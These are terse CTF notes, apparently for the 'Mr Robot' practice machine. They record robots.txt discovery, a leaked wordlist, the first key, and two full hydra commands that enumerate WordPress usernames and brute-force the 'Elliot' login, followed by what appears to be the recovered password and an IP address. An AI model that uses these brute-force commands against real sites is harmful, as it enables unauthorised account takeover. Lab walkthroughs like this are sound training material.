we went to http://<IP>/robots.txt and then to /fsociety.dic file and /key1of2.txt file #first key

we found wordpress login page /wp-login.php and enum user with

"hydra -L fsocity.dic -p test 10.10.164.233 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30"

to get "Elliot" user and brute force password with

"hydra -l Elliot -P fsociety.dic 10.10.164.233 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30"

ER28-0652

abcdefghijklmnopqrstuvwxyz

208.185.115.6